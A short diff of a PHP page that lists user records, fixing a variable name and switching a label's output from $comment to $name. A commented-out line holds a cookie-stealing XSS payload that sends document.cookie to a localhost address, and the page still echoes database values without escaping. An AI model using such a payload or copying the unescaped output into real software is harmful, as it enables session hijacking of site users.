@@ -24,7 +24,7 @@
         // Fetch data
         while ($row = $result->fetch_assoc()) {
             // Process each row of data
-            $name = $row['user_id'];
+            $id = $row['user_id'];
             $name = $row['user_name'];
             $email = $row['user_email'];
             $salary = $row['salary'];
@@ -120,7 +120,7 @@
                 <?php
                 //  $comment = "<script>document.location='http://127.0.0.1/cookie/cookie='+document.cookie</script>";
                 ?>
-                <label class="form-control-plaintext text-light bg-primary text-light bg-primary"><?php echo $comment; ?></label>
+                <label class="form-control-plaintext text-light bg-primary text-light bg-primary"><?php echo $name; ?></label>
             </div>
         </div>
         <div class="form-group row">
